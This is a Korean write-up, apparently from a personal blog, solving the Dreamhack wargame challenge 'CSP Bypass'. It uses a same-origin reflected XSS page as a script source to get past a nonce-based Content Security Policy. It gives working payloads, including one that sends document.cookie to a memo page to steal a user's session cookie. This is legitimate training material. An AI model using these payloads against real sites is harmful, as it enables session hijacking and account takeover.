---
title : "드림핵 워게임 CSP Bypass"
tags : 
date : "2026-06-14"
bookmark :  true
---

# 문제 설명
--------------
CSP를 우회하고 XSS 취약점을 통해 임의 이용자의 쿠키를 탈취하자


# 문제 풀이
--------------
vuln 페이지 코드를 보면 내가 입력한 파라미터를 그대로 출력해주는 취약한 페이지이다.

![설명]({{ '/assets/img/csp_1.png' | relative_url }})

flag 페이지 코드에서 add_header 함수를 보면, 자바스크립트를 실행할때는 출처가 자신의 사이트이거나, 발급한 랜덤한 nonce값을 정확히 갖고있는 &lt;script&gt;태그만 실행하도록 설정되어있다.


![설명]({{ '/assets/img/csp_2.png' | relative_url }})

![설명]({{ '/assets/img/csp_3.png' | relative_url }})

CSP 정책을 우회하기 위해 자신의 사이트인 vuln페이지를 이용해야된다.

vuln 페이지에서

```
/vuln?param=<script%20src="/vuln?param=alert(1)"></script> 
```
이 스크립트를 작성하고 실행해보면

![설명]({{ '/assets/img/csp_4.png' | relative_url }})


alert창이 잘 실행된다.

이용자의 쿠키를 탈취하기 위해서 flag 페이지에서 

```
<script src="/vuln?param=document.location='/memo?memo='%2bdocument.cookie"></script>
```
이 코드를 입력하여 memo 페이지에서 이용자의 쿠키가 보이도록 만든다.

![설명]({{ '/assets/img/csp_5.png' | relative_url }})

이제 memo 페이지를 들어가보면 이용자의 쿠키가 나온다.

![설명]({{ '/assets/img/csp_6.png' | relative_url }})